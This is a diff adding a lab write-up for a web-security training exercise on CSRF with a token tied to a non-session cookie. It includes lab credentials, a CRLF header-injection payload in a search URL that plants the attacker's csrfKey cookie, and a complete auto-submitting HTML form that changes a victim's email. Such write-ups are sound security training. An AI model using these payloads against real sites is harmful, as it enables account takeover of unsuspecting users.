@@ -1,0 +1,32 @@
+Lab #5 - CSRF where token is tied to non-session cookie
+
+Vulnerability - This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.
+
+Goal - use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+Credentials: 
+- wiener:peter
+- carlos:montoya
+
+Analysis:
+- Log in with provided account and change email address to see the request and response => see csrf token and csrfKey cookie
+- DELETE CSRF token => Invalid CSRF token
+- Change request method to GET => Method not allowed
+- Send a request to change email address with csrf token of other user => invalid CSRF token
+- Send a request to change email address with both csrf token and csrfKey cookie of other uses => SUCCESSFULLY 
+=> CSRF token is tied to non-session cookie
+- Search the blog in search bar and see the results: Set-Cookie: LastSearchTerm=Apps; Secure; HttpOnly
+=> use this to set cookie to victim's browser: /?search=test\r\nSet-Cookie: csrfKey=YOUR-KEY; SameSite=None <=> /?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
+=> embeded it into a source of an image in an HTML form
+
+Solution:
+- create an HTML form
+- note to inject attacker's csrfKey cookie to set csrfKey cookie of victim's browser
+- create a from with a csrf token of attacker's browser and send to victim
+
+    <form method="POST" action="https://0ae9001704f4bda18330012600fe0005.web-security-academy.net/my-account/change-email">
+        <input type="hidden" name="email" value="user@evil-email.com">
+        <input name="csrf" type="hidden" value="15IijWiLFUbZJBGMdOmdqJaRIxro3PlX"> 
+        <img src="https://0ae9001704f4bda18330012600fe0005.web-security-academy.net/?search=test\r\nSet-Cookie: csrfKey="H044k3wGobmW3JSWCoBB9LWhE05vFuD3"; SameSite=None" onerror="document.forms[0].submit()">
+    </form>
+
